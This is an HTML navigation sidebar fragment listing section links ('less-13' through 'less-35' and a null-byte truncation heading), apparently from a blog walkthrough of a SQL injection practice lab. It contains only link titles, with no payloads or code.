class="nav-text">less-13</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-14"><span class="nav-number">1.3.4.</span> <span class="nav-text">less-14</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-15"><span class="nav-number">1.3.5.</span> <span class="nav-text">less-15</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-16"><span class="nav-number">1.3.6.</span> <span class="nav-text">less-16</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-17"><span class="nav-number">1.3.7.</span> <span class="nav-text">less-17</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-18"><span class="nav-number">1.3.8.</span> <span class="nav-text">less-18</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-19"><span class="nav-number">1.3.9.</span> <span class="nav-text">less-19</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-20"><span class="nav-number">1.3.10.</span> <span class="nav-text">less-20</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-21"><span class="nav-number">1.3.11.</span> <span class="nav-text">less-21</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-22"><span class="nav-number">1.3.12.</span> <span class="nav-text">less-22</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-23"><span class="nav-number">1.3.13.</span> <span class="nav-text">less-23</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#00%E6%88%AA%E6%96%AD"><span class="nav-number">1.3.14.</span> <span class="nav-text">%00截断</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-24"><span class="nav-number">1.3.15.</span> <span class="nav-text">less-24</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-25"><span class="nav-number">1.3.16.</span> <span class="nav-text">less-25</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-25a"><span class="nav-number">1.3.17.</span> <span class="nav-text">less-25a</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-26"><span class="nav-number">1.3.18.</span> <span class="nav-text">less-26</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-26a"><span class="nav-number">1.3.19.</span> <span class="nav-text">less-26a</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-27"><span class="nav-number">1.3.20.</span> <span class="nav-text">less-27</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-27a"><span class="nav-number">1.3.21.</span> <span class="nav-text">less-27a</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-28"><span class="nav-number">1.3.22.</span> <span class="nav-text">less-28</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-29"><span class="nav-number">1.3.23.</span> <span class="nav-text">less-29</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-30"><span class="nav-number">1.3.24.</span> <span class="nav-text">less-30</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-31"><span class="nav-number">1.3.25.</span> <span class="nav-text">less-31</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-32"><span class="nav-number">1.3.26.</span> <span class="nav-text">less-32</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-33"><span class="nav-number">1.3.27.</span> <span class="nav-text">less-33</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-34"><span class="nav-number">1.3.28.</span> <span class="nav-text">less-34</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-35"><span class="nav-number">1.3.29.</span> <span class="nav-text">less-35</span></a></li></ol></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
